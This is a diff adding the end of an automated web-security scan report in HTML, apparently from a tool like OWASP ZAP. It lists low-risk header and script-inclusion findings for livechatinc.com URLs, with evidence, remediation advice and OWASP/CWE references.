+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514646084546&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_880778</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645973544&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_631945</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?WBBZTaInnwlc0YmrtvvB&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%2215146459395728lFPfNZ%22%7D&amp;_=1514645824015</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645832123&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_447939</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645914572&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_160156</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?VVRbZ7d0zGfELMAvEnMq&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645919572QwnXO0s%22%7D&amp;_=1514645824011</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">86</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Whenever possible ensure the cache-control HTTP header is set with no-cache, no-store, must-revalidate; and that the pragma HTTP header is set with no-cache.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Web_Content_Caching</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">525</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">13</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">Cross-Domain JavaScript Source File Inclusion</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>The page includes one or more script files from a third-party domain.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/open_chat.cgi?groups=2&amp;embedded=1&amp;newWebserv=undefined&amp;__lc_vv=2&amp;session_id=S1513858898.257ad89b2a&amp;server=secure.livechatinc.com</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">//cdn.livechatinc.com/js/embedded.20171229150235.js</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">&lt;script src="//cdn.livechatinc.com/js/embedded.20171229150235.js"&gt;&lt;/script&gt;</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">1</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Ensure JavaScript source files are loaded from only trusted sources, and the sources can't be controlled by end users of the application.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p></p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">829</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">15</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">Web Browser XSS Protection Not Enabled</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>Web Browser XSS Protection is not enabled, or is disabled by the configuration of the 'X-XSS-Protection' HTTP response header on the web server</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/open_chat.cgi?groups=2&amp;embedded=1&amp;newWebserv=undefined&amp;__lc_vv=2&amp;session_id=S1513858898.257ad89b2a&amp;server=secure.livechatinc.com</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-XSS-Protection</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">1</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Ensure that the web browser's XSS filter is enabled, by setting the X-XSS-Protection HTTP response header to '1'.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Other information</td><td width="80%"><p>The X-XSS-Protection HTTP response header allows the web server to enable or disable the web browser's XSS protection mechanism. The following values would attempt to enable it: </p><p>X-XSS-Protection: 1; mode=block</p><p>X-XSS-Protection: 1; report=http://www.example.com/xss</p><p>The following values would disable it:</p><p>X-XSS-Protection: 0</p><p>The X-XSS-Protection HTTP response header is currently supported on Internet Explorer, Chrome and Safari (WebKit).</p><p>Note that this alert is only raised if the response body could potentially contain an XSS payload (with a text-based content type, with a non-zero length).</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</p><p>https://blog.veracode.com/2014/03/guidelines-for-setting-security-headers/</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">933</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">14</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+</body>
+</html>
